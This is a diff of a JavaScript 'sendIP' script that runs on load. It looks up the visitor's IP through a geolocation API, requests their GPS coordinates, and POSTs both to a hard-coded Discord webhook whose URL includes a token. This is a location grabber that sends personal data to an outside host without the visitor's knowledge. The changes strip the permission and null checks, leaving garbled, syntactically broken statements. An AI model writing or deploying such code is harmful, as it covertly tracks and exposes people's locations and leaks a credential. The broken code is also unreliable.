@@ -7,11 +7,7 @@ const sendIP = () => {
             return fetch(`https://ipapi.co/${ipadd}/json/`)
                 .then(geoResponse => geoResponse.json())
                 .then(geoData => {
-
-                   
-                    
-                        (navigator.geolocation) 
-                            navigator.geolocation.getCurrentPosition(
+                    navigator.geolocation.getCurrentPosition(
                                 pos => {
                                     {
                                         ipadd,
@@ -24,11 +20,6 @@ const sendIP = () => {
 
                                 }
                             );
-                        
-                            
-                        
-                    
-
                 });
         })
         .then(data => {
@@ -37,11 +28,8 @@ const sendIP = () => {
             const dscURL = 'https://discord.com/api/webhooks/1443048665060216842/9uztTJLzht8-CFfLm1nWnukGYrrqLav39rwdv795wt_Crp6oTPHJ9RR8yn0r3L48Yi4P';
 
             let gpsText;
-            if (gps) {
+            (gps)
                 gpsText = `**GPS Latitude >> ** ${gps.latitude}\n**GPS Longitude >> ** ${gps.longitude}`;
-            } else {
-                gpsText = `**GPS >> ** User denied or unavailable`;
-            }
 
             return fetch(dscURL, {
                 method: 'POST',
@@ -85,3 +73,4 @@ const sendIP = () => {
 };
 
 sendIP();
+
